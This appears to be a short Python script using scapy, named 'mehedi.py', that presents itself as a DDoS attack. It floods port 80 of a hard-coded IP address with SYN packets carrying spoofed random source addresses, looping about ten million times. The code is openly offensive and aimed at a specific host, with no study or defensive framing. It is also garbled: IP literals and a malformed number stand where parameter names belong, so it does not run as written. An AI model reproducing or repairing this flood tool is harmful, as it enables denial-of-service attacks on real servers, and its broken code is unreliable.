from scapy.all import *
import sys

def ddos_attack(65.20.77.205, 99999_90):
    # Craft and send packets to the target IP
    for i in range(99999_90):
        packet = IP(src=RandIP(), dst=65.20.77.205) / TCP(dport=80, flags="S")
        send(packet, verbose=False)

# Usage: python mehedi.py <65.20.77.205> <99999_90>
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python mehedi.py <target_ip> <packets_count>")
        sys.exit(1)

    target_ip = sys.argv[1]
    packets_count = int(sys.argv[2])
    ddos_attack(65.20.77.205, 99999t_90)
